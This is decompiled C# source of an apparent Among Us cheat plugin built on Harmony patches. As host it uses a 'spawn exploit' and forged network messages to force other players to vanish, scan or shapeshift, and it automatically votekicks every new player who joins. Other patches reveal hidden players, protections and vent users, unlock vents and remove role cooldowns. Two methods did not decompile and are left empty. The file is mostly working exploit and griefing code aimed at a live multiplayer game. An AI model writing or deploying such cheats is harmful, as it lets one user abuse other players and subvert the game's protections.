    {
      try
      {
        if (ChocooPlugin.selectedHostKickTargetId == -1)
          return;
        if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Must be host to force vanish!");
        }
        else
        {
          PlayerControl target = (PlayerControl) null;
          foreach (PlayerControl cachedPlayer in this._cachedPlayers)
          {
            if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null) && cachedPlayer.Data.ClientId == ChocooPlugin.selectedHostKickTargetId)
            {
              target = cachedPlayer;
              break;
            }
          }
          if (Object.op_Equality((Object) target, (Object) null))
            return;
          MonoBehaviourExtensions.StartCoroutine((MonoBehaviour) this, this.CoForceVanish(target));
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ForceVanishPlayer error: " + ex.Message));
      }
    }

    [HideFromIl2Cpp]
    private IEnumerator CoForceVanish(PlayerControl target)
    {
      ChocooPlugin.InjectSpawnExploitTo(target);
      yield return (object) new WaitForSeconds(0.3f);
      RoleTypes currentRole = target.Data.RoleType;
      target.RpcSetRole((RoleTypes) 9, true);
      yield return (object) new WaitForSeconds(0.5f);
      target.RpcVanish();
      target.SetRoleInvisibility(true, true, true);
      yield return (object) new WaitForSeconds(0.3f);
      target.RpcSetRole(currentRole, true);
      ChocooPlugin.Logger.LogInfo((object) ("Force vanished " + target.Data.PlayerName));
    }

    private void ForceScanPlayer()
    {
      try
      {
        if (ChocooPlugin.selectedHostKickTargetId == -1)
          return;
        if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Must be host to force scan!");
        }
        else
        {
          PlayerControl target = (PlayerControl) null;
          foreach (PlayerControl cachedPlayer in this._cachedPlayers)
          {
            if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null) && cachedPlayer.Data.ClientId == ChocooPlugin.selectedHostKickTargetId)
            {
              target = cachedPlayer;
              break;
            }
          }
          if (Object.op_Equality((Object) target, (Object) null))
            return;
          MonoBehaviourExtensions.StartCoroutine((MonoBehaviour) this, this.CoForceScan(target));
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ForceScanPlayer error: " + ex.Message));
      }
    }

    [HideFromIl2Cpp]
    private IEnumerator CoForceScan(PlayerControl target)
    {
      ChocooPlugin.InjectSpawnExploitTo(target);
      yield return (object) new WaitForSeconds(0.3f);
      byte[] taskIds = new byte[1];
      Il2CppStructArray<byte> il2cppTaskArray = new Il2CppStructArray<byte>(taskIds);
      target.Data.RpcSetTasks(il2cppTaskArray);
      yield return (object) new WaitForSeconds(0.5f);
      byte scannerCount = (byte) ((uint) target.scannerCount + 1U);
      MessageWriter writer = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) target).NetId, (byte) 15, (SendOption) 1, -1);
      writer.Write(true);
      writer.Write(scannerCount);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(writer);
      target.SetScanner(true, scannerCount);
      ChocooPlugin.Logger.LogInfo((object) ("Forced scan on " + target.Data.PlayerName));
    }

    private void ForceShapeshiftAll()
    {
      try
      {
        if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Must be host to force shapeshift all!");
        }
        else if (Object.op_Equality((Object) ChocooPlugin.selectedShapeshiftTarget, (Object) null))
        {
          if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Please select a Shapeshift Target first!");
          ChocooPlugin.Logger.LogWarning((object) "No shapeshift target selected for SS ALL");
        }
        else
        {
          ChocooPlugin.InjectSpawnExploitToAllPlayers();
          foreach (PlayerControl cachedPlayer in this._cachedPlayers)
          {
            if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null))
              MonoBehaviourExtensions.StartCoroutine((MonoBehaviour) this, this.CoForceShapeshift(cachedPlayer, ChocooPlugin.selectedShapeshiftTarget));
          }
          ChocooPlugin.Logger.LogInfo((object) ("Force shapeshifted all players into " + ChocooPlugin.selectedShapeshiftTarget.Data.PlayerName));
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ForceShapeshiftAll error: " + ex.Message));
      }
    }

    private void ForceVanishAll()
    {
      try
      {
        if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Must be host to force vanish all!");
        }
        else
        {
          ChocooPlugin.InjectSpawnExploitToAllPlayers();
          foreach (PlayerControl cachedPlayer in this._cachedPlayers)
          {
            if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null))
              MonoBehaviourExtensions.StartCoroutine((MonoBehaviour) this, this.CoForceVanish(cachedPlayer));
          }
          ChocooPlugin.Logger.LogInfo((object) "Force vanished all players");
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ForceVanishAll error: " + ex.Message));
      }
    }

    private void ForceScanAll()
    {
      try
      {
        if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Must be host to force scan all!");
        }
        else
        {
          ChocooPlugin.InjectSpawnExploitToAllPlayers();
          MonoBehaviourExtensions.StartCoroutine((MonoBehaviour) this, this.CoForceScanAll());
          ChocooPlugin.Logger.LogInfo((object) "Force scanning all players");
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ForceScanAll error: " + ex.Message));
      }
    }

    [HideFromIl2Cpp]
    private IEnumerator CoForceScanAll()
    {
      yield return (object) new WaitForSeconds(0.5f);
      PlayerControl[] playerControlArray1 = this._cachedPlayers;
      for (int index = 0; index < playerControlArray1.Length; ++index)
      {
        PlayerControl targetPlayer = playerControlArray1[index];
        if (Object.op_Inequality((Object) targetPlayer, (Object) null) && Object.op_Inequality((Object) targetPlayer.Data, (Object) null))
        {
          byte[] taskIds = new byte[1];
          Il2CppStructArray<byte> il2cppTaskArray = new Il2CppStructArray<byte>(taskIds);
          targetPlayer.Data.RpcSetTasks(il2cppTaskArray);
          yield return (object) new WaitForSeconds(0.1f);
          taskIds = (byte[]) null;
          il2cppTaskArray = (Il2CppStructArray<byte>) null;
        }
        targetPlayer = (PlayerControl) null;
      }
      playerControlArray1 = (PlayerControl[]) null;
      yield return (object) new WaitForSeconds(0.3f);
      PlayerControl[] playerControlArray2 = this._cachedPlayers;
      for (int index = 0; index < playerControlArray2.Length; ++index)
      {
        PlayerControl targetPlayer = playerControlArray2[index];
        if (Object.op_Inequality((Object) targetPlayer, (Object) null) && Object.op_Inequality((Object) targetPlayer.Data, (Object) null))
        {
          byte scannerCount = (byte) ((uint) targetPlayer.scannerCount + 1U);
          MessageWriter writer = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) targetPlayer).NetId, (byte) 15, (SendOption) 1, -1);
          writer.Write(true);
          writer.Write(scannerCount);
          ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(writer);
          targetPlayer.SetScanner(true, scannerCount);
          yield return (object) new WaitForSeconds(0.05f);
          writer = (MessageWriter) null;
        }
        targetPlayer = (PlayerControl) null;
      }
      playerControlArray2 = (PlayerControl[]) null;
    }

    private void MonitorAndVotekickNewPlayers()
    {
      try
      {
        if (Object.op_Equality((Object) VoteBanSystem.Instance, (Object) null))
          return;
        foreach (PlayerControl cachedPlayer in this._cachedPlayers)
        {
          if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && !((InnerNetObject) cachedPlayer).AmOwner && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null))
          {
            int clientId = cachedPlayer.Data.ClientId;
            if (!ChocooPlugin.votekickedPlayerIds.Contains(clientId))
            {
              for (int index = 0; index < 3; ++index)
                VoteBanSystem.Instance.CmdAddVote(clientId);
              ChocooPlugin.votekickedPlayerIds.Add(clientId);
              string str = cachedPlayer.Data.PlayerName ?? "Unknown";
              ChocooPlugin.Logger.LogInfo((object) ("Auto-votekicked new player: " + str));
              if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null))
                DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, "<color=orange>[Auto-Votekick]</color> Votekicked " + str, true);
            }
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Monitor votekick error: " + ex.Message));
      }
    }

    private void HandleResize()
    {
      Event current = Event.current;
      this.resizeHandleRect = new Rect((float) ((double) ((Rect) ref this.windowRect).x + (double) ((Rect) ref this.windowRect).width - 15.0), (float) ((double) ((Rect) ref this.windowRect).y + (double) ((Rect) ref this.windowRect).height - 15.0), 15f, 15f);
      if (current.type == null && current.button == 0 && ((Rect) ref this.resizeHandleRect).Contains(current.mousePosition))
      {
        this.isResizing = true;
        this.resizeStart = current.mousePosition;
        current.Use();
      }
      if (this.isResizing)
      {
        if (current.type == 3)
        {
          Vector2 vector2 = Vector2.op_Subtraction(current.mousePosition, this.resizeStart);
          float num1 = ((Rect) ref this.windowRect).width + vector2.x;
          float num2 = ((Rect) ref this.windowRect).height + vector2.y;
          ((Rect) ref this.windowRect).width = Mathf.Clamp(num1, 280f, 800f);
          ((Rect) ref this.windowRect).height = Mathf.Clamp(num2, 400f, 1000f);
          this.resizeStart = current.mousePosition;
          current.Use();
        }
        if (current.type == 1 && current.button == 0)
        {
          this.isResizing = false;
          current.Use();
        }
      }
      if (!((Rect) ref this.resizeHandleRect).Contains(Event.current.mousePosition) && !this.isResizing)
        ;
    }

    private void DrawResizeHandle()
    {
      GUI.backgroundColor = this.isResizing ? Color.yellow : new Color(0.5f, 0.5f, 0.5f, 0.8f);
      GUI.Box(this.resizeHandleRect, "", new GUIStyle(GUI.skin.box)
      {
        normal = {
          background = this.MakeTex(2, 2, this.isResizing ? new Color(1f, 1f, 0.0f, 0.5f) : new Color(0.3f, 0.3f, 0.3f, 0.5f))
        }
      });
      GUI.contentColor = Color.white;
      GUI.Label(this.resizeHandleRect, "⋰", new GUIStyle(GUI.skin.label)
      {
        fontSize = 12,
        fontStyle = (FontStyle) 1,
        alignment = (TextAnchor) 4
      });
      GUI.contentColor = Color.white;
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
    }

    private class SearchResult
    {
      public string featureName;
      public string tabName;
      public string description;
    }
  }

  [HarmonyPatch(typeof (EngineerRole), "FixedUpdate")]
  public static class EngineerRole_FixedUpdate
  {
    [HarmonyPostfix]
    public static void Postfix(EngineerRole __instance)
    {
      if (Object.op_Inequality((Object) ((RoleBehaviour) __instance).Player, (Object) PlayerControl.LocalPlayer))
        return;
      if (ChocooPlugin.EndlessVentTime)
        __instance.inVentTimeRemaining = float.MaxValue;
      else if ((double) __instance.inVentTimeRemaining > (double) __instance.GetCooldown())
        __instance.inVentTimeRemaining = __instance.GetCooldown();
      if (!ChocooPlugin.NoVentCooldown || (double) __instance.cooldownSecondsRemaining <= 0.0)
        return;
      __instance.cooldownSecondsRemaining = 0.0f;
      if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance?.AbilityButton, (Object) null))
      {
        ((ActionButton) DestroyableSingleton<HudManager>.Instance.AbilityButton).ResetCoolDown();
        ((ActionButton) DestroyableSingleton<HudManager>.Instance.AbilityButton).SetCooldownFill(0.0f);
      }
    }
  }

  [HarmonyPatch(typeof (ScientistRole), "Update")]
  public static class ScientistRole_Update
  {
    [HarmonyPostfix]
    public static void Postfix(ScientistRole __instance)
    {
      if (Object.op_Inequality((Object) ((RoleBehaviour) __instance).Player, (Object) PlayerControl.LocalPlayer))
        return;
      if (ChocooPlugin.NoVitalsCooldown)
        __instance.currentCooldown = 0.0f;
      if (ChocooPlugin.EndlessBattery)
      {
        __instance.currentCharge = float.MaxValue;
      }
      else
      {
        if ((double) __instance.currentCharge <= (double) __instance.RoleCooldownValue)
          return;
        __instance.currentCharge = __instance.RoleCooldownValue;
      }
    }
  }

  [HarmonyPatch(typeof (TrackerRole), "FixedUpdate")]
  public static class TrackerRole_FixedUpdate
  {
    [HarmonyPostfix]
    public static void Postfix(TrackerRole __instance)
    {
      if (Object.op_Inequality((Object) ((RoleBehaviour) __instance).Player, (Object) PlayerControl.LocalPlayer))
        return;
      if (ChocooPlugin.NoTrackingCooldown)
      {
        __instance.cooldownSecondsRemaining = 0.0f;
        __instance.delaySecondsRemaining = 0.0f;
        if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance?.AbilityButton, (Object) null))
        {
          ((ActionButton) DestroyableSingleton<HudManager>.Instance.AbilityButton).ResetCoolDown();
          ((ActionButton) DestroyableSingleton<HudManager>.Instance.AbilityButton).SetCooldownFill(0.0f);
        }
      }
      if (ChocooPlugin.NoTrackingDelay && Object.op_Inequality((Object) MapBehaviour.Instance, (Object) null))
        MapBehaviour.Instance.trackedPointDelayTime = GameManager.Instance.LogicOptions.GetRoleFloat((FloatOptionNames) 1552);
      if (ChocooPlugin.EndlessTracking)
      {
        __instance.durationSecondsRemaining = float.MaxValue;
      }
      else
      {
        if ((double) __instance.durationSecondsRemaining <= (double) GameManager.Instance.LogicOptions.GetRoleFloat((FloatOptionNames) 1551))
          return;
        __instance.durationSecondsRemaining = GameManager.Instance.LogicOptions.GetRoleFloat((FloatOptionNames) 1551);
      }
    }
  }

  [HarmonyPatch(typeof (ShapeshifterRole), "FixedUpdate")]
  public static class ShapeshifterRole_FixedUpdate
  {
    [HarmonyPostfix]
    public static void Postfix(ShapeshifterRole __instance)
    {
      try
      {
        if (Object.op_Inequality((Object) ((RoleBehaviour) __instance).Player, (Object) PlayerControl.LocalPlayer))
          return;
        if (ChocooPlugin.EndlessShapeshiftDuration)
        {
          __instance.durationSecondsRemaining = float.MaxValue;
        }
        else
        {
          if ((double) __instance.durationSecondsRemaining <= (double) GameManager.Instance.LogicOptions.GetRoleFloat((FloatOptionNames) 1001))
            return;
          __instance.durationSecondsRemaining = GameManager.Instance.LogicOptions.GetRoleFloat((FloatOptionNames) 1001);
        }
      }
      catch
      {
      }
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "CmdCheckShapeshift")]
  public static class PlayerControl_CmdCheckShapeshift
  {
    [HarmonyPrefix]
    public static void Prefix(ref bool shouldAnimate)
    {
      if (!shouldAnimate || !ChocooPlugin.NoShapeshiftAnimation)
        return;
      shouldAnimate = false;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "CmdCheckRevertShapeshift")]
  public static class PlayerControl_CmdCheckRevertShapeshift
  {
    [HarmonyPrefix]
    public static void Prefix(ref bool shouldAnimate)
    {
      if (!shouldAnimate || !ChocooPlugin.NoShapeshiftAnimation)
        return;
      shouldAnimate = false;
    }
  }

  [HarmonyPatch(typeof (ImpostorRole), "FindClosestTarget")]
  public static class ImpostorRole_FindClosestTarget
  {
    [HarmonyPrefix]
    public static bool Prefix(ImpostorRole __instance, ref PlayerControl __result)
    {
      // ISSUE: unable to decompile the method.
    }
  }

  [HarmonyPatch(typeof (DetectiveRole), "FindClosestTarget")]
  public static class DetectiveRole_FindClosestTarget
  {
    [HarmonyPrefix]
    public static bool Prefix(DetectiveRole __instance, ref PlayerControl __result)
    {
      // ISSUE: unable to decompile the method.
    }
  }

  [HarmonyPatch(typeof (GameData), "ShowNotification")]
  public static class BlackoutDisconnectMessage
  {
    public static bool Enabled { get; set; } = true;

    private static bool Prefix(string playerName, DisconnectReasons reason)
    {
      if (!ChocooPlugin.BlackoutDisconnectMessage.Enabled || !ChocooPlugin.blackoutedPlayers.Contains(playerName) || !ChocooPlugin.blackoutTimestamps.ContainsKey(playerName) || (double) (Time.time - ChocooPlugin.blackoutTimestamps[playerName]) > 2.0)
        return true;
      DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage($"<color=#9966FF>[BLACKOUT]</color> {playerName} was banned!");
      ChocooPlugin.blackoutedPlayers.Remove(playerName);
      ChocooPlugin.blackoutTimestamps.Remove(playerName);
      return false;
    }
  }

  [HarmonyPatch(typeof (ChatBubble), "SetText")]
  public static class DarkMode_ChatBubblePatch
  {
    [HarmonyPrefix]
    public static void Prefix(ChatBubble __instance, ref string chatText)
    {
      if (!ChocooPlugin.DarkModeEnabled)
        return;
      try
      {
        SpriteRenderer component = ((Component) ((Component) __instance).transform.Find("Background"))?.GetComponent<SpriteRenderer>();
        if (Object.op_Inequality((Object) component, (Object) null))
          component.color = new Color(0.15f, 0.15f, 0.15f, 1f);
        if (chatText.Contains("░") || chatText.Contains("▄") || chatText.Contains("█") || chatText.Contains("▌") || chatText.Contains("▒"))
          return;
        chatText = $"<color=#FFFFFF>{chatText.TrimEnd(new char[1])}</color>";
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("DarkMode ChatBubble error: " + ex.Message));
      }
    }
  }

  [HarmonyPatch(typeof (ChatController), "Update")]
  public static class DarkMode_ChatControllerPatch
  {
    [HarmonyPostfix]
    public static void Postfix(ChatController __instance)
    {
      if (!ChocooPlugin.DarkModeEnabled)
        return;
      try
      {
        if (Object.op_Inequality((Object) ((AbstractChatInputField) __instance.freeChatField)?.background, (Object) null))
          ((AbstractChatInputField) __instance.freeChatField).background.color = Color32.op_Implicit(new Color32((byte) 40, (byte) 40, (byte) 40, byte.MaxValue));
        if (Object.op_Inequality((Object) __instance.freeChatField?.textArea?.outputText, (Object) null))
          ((Graphic) __instance.freeChatField.textArea.outputText).color = Color.white;
        if (Object.op_Inequality((Object) ((AbstractChatInputField) __instance.quickChatField)?.background, (Object) null))
          ((AbstractChatInputField) __instance.quickChatField).background.color = Color32.op_Implicit(new Color32((byte) 40, (byte) 40, (byte) 40, byte.MaxValue));
        if (!Object.op_Inequality((Object) __instance.quickChatField?.text, (Object) null))
          return;
        ((Graphic) __instance.quickChatField.text).color = Color.white;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("DarkMode ChatController error: " + ex.Message));
      }
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "TurnOnProtection")]
  public static class SeeProtectionsPatch
  {
    [HarmonyPrefix]
    public static void Prefix(ref bool visible)
    {
      if (!ChocooPlugin.SeeProtectionsEnabled)
        return;
      visible = true;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "FixedUpdate")]
  public static class SeePhantomsPatch
  {
    [HarmonyPostfix]
    public static void Postfix(PlayerControl __instance)
    {
      if (!ChocooPlugin.SeePhantomsEnabled || Object.op_Equality((Object) __instance, (Object) null))
        return;
      try
      {
        PlayerControl localPlayer = PlayerControl.LocalPlayer;
        if (Object.op_Equality((Object) localPlayer, (Object) null) || Object.op_Equality((Object) __instance.Data, (Object) null) || Object.op_Equality((Object) localPlayer.Data, (Object) null))
          return;
        NetworkedPlayerInfo data1 = __instance.Data;
        NetworkedPlayerInfo data2 = localPlayer.Data;
        bool flag1 = Object.op_Equality((Object) __instance, (Object) localPlayer) || data2.Role.IsImpostor || data2.IsDead;
        RoleBehaviour role = data1.Role;
        if ((role != null ? (role.Role == 9 ? 1 : 0) : 0) == 0 || flag1)
          return;
        bool flag2 = ChocooPlugin.vanishedPlayers.Contains(__instance.PlayerId);
        if (flag2 && (double) __instance.invisibilityAlpha < 0.5)
        {
          __instance.SetInvisibility(false);
          bool isDead = data2.IsDead;
          if (!isDead)
            data2.IsDead = true;
          __instance.SetInvisibility(true);
          if (!isDead)
            data2.IsDead = false;
        }
        else if (flag2 && (double) __instance.invisibilityAlpha == 0.5 && !ChocooPlugin.SeePhantomsEnabled)
          __instance.SetInvisibility(true);
      }
      catch
      {
      }
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "SetRoleInvisibility")]
  public static class TrackVanishedPhantomsPatch
  {
    [HarmonyPostfix]
    public static void Postfix(PlayerControl __instance, bool isActive)
    {
      if (Object.op_Equality((Object) __instance, (Object) null))
        return;
      try
      {
        NetworkedPlayerInfo data = __instance.Data;
        if (Object.op_Equality((Object) data, (Object) null) || !Object.op_Inequality((Object) data.Role, (Object) null) || data.Role.Role != 9)
          return;
        if (isActive)
        {
          if (!ChocooPlugin.vanishedPlayers.Contains(__instance.PlayerId))
            ChocooPlugin.vanishedPlayers.Add(__instance.PlayerId);
        }
        else
          ChocooPlugin.vanishedPlayers.Remove(__instance.PlayerId);
      }
      catch
      {
      }
    }
  }

  [HarmonyPatch(typeof (PlayerPhysics), "FixedUpdate")]
  public static class SeePlayersInVentsPatch
  {
    [HarmonyPostfix]
    public static void Postfix(PlayerPhysics __instance)
    {
      if (!ChocooPlugin.SeePlayersInVentsEnabled || Object.op_Equality((Object) __instance, (Object) null))
        return;
      try
      {
        PlayerControl myPlayer = __instance.myPlayer;
        if (Object.op_Equality((Object) myPlayer, (Object) null) || Object.op_Equality((Object) myPlayer, (Object) PlayerControl.LocalPlayer))
          return;
        if (myPlayer.inVent)
        {
          myPlayer.Visible = true;
          myPlayer.invisibilityAlpha = 0.5f;
          if (!Object.op_Inequality((Object) myPlayer.cosmetics, (Object) null))
            return;
          myPlayer.cosmetics.SetPhantomRoleAlpha(0.5f);
          if (Object.op_Inequality((Object) myPlayer.cosmetics.nameText, (Object) null))
            ((Component) myPlayer.cosmetics.nameText).gameObject.SetActive(true);
        }
        else if ((double) myPlayer.invisibilityAlpha == 0.5)
        {
          NetworkedPlayerInfo data = myPlayer.Data;
          if (Object.op_Inequality((Object) data, (Object) null) && !data.IsDead)
          {
            myPlayer.Visible = true;
            myPlayer.invisibilityAlpha = 1f;
            if (Object.op_Inequality((Object) myPlayer.cosmetics, (Object) null))
              myPlayer.cosmetics.SetPhantomRoleAlpha(1f);
          }
        }
      }
      catch
      {
      }
    }
  }

  [HarmonyPatch(typeof (HudManager), "Update")]
  public static class UnlockVentsShowButtonPatch
  {
    [HarmonyPostfix]
    public static void Postfix(HudManager __instance)
    {
      if (!ChocooPlugin.UnlockVentsEnabled || Object.op_Equality((Object) __instance, (Object) null))
        return;
      try
      {
        PlayerControl localPlayer = PlayerControl.LocalPlayer;
        if (Object.op_Equality((Object) localPlayer, (Object) null) || Object.op_Equality((Object) localPlayer.Data, (Object) null) || localPlayer.Data.Role.CanVent || localPlayer.Data.IsDead || !Object.op_Inequality((Object) __instance.ImpostorVentButton, (Object) null))
          return;
        ((Component) __instance.ImpostorVentButton).gameObject.SetActive(true);
      }
      catch
      {
      }
    }
  }

  [HarmonyPatch(typeof (Vent), "CanUse")]
  public static class UnlockVentsCanUsePatch
  {
    [HarmonyPostfix]
    public static void Postfix(
      Vent __instance,
      NetworkedPlayerInfo pc,
      ref bool canUse,
      ref bool couldUse,
      ref float __result)
    {
      if (!ChocooPlugin.UnlockVentsEnabled)
        return;
      try
      {
        PlayerControl localPlayer = PlayerControl.LocalPlayer;
        if (Object.op_Equality((Object) localPlayer, (Object) null) || Object.op_Equality((Object) localPlayer.Data, (Object) null) || localPlayer.Data.Role.CanVent || localPlayer.Data.IsDead)
          return;
        PlayerControl playerControl = pc.Object;
        if (Object.op_Equality((Object) playerControl, (Object) null))
          return;
        Bounds bounds = playerControl.Collider.bounds;
        Vector3 center = ((Bounds) ref bounds).center;
        Vector3 position = ((Component) __instance).transform.position;
        float num = Vector2.Distance(Vector2.op_Implicit(center), Vector2.op_Implicit(position));
        canUse = (double) num <= (double) __instance.UsableDistance && !PhysicsHelpers.AnyNonTriggersBetween(Vector2.op_Implicit(center), Vector2.op_Implicit(position), (float) Constants.ShipOnlyMask, 0);
        couldUse = true;
        __result = num;
      }
      catch
      {
      }
    }
  }

  [HarmonyPatch(typeof (LogicOptionsHnS), "GetCrewmateLeadTime")]
  public static class NoSeekerAnimationPatch
  {
    [HarmonyPrefix]
    public static bool Prefix(ref int __result)
    {
      if (!ChocooPlugin.NoSeekerAnimEnabled)
        return true;
      __result = 0;
      return false;
    }
  }

  [HarmonyPatch(typeof (ShhhBehaviour), "PlayAnimation")]
  public static class NoShhScreenPatch
  {
    [HarmonyPrefix]
    public static bool Prefix()
    {
      if (!ChocooPlugin.NoShhScreenEnabled)
        return true;
      if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.shhhEmblem, (Object) null))
        ((Component) DestroyableSingleton<HudManager>.Instance.shhhEmblem).gameObject.SetActive(false);
      return false;
    }
  }
}
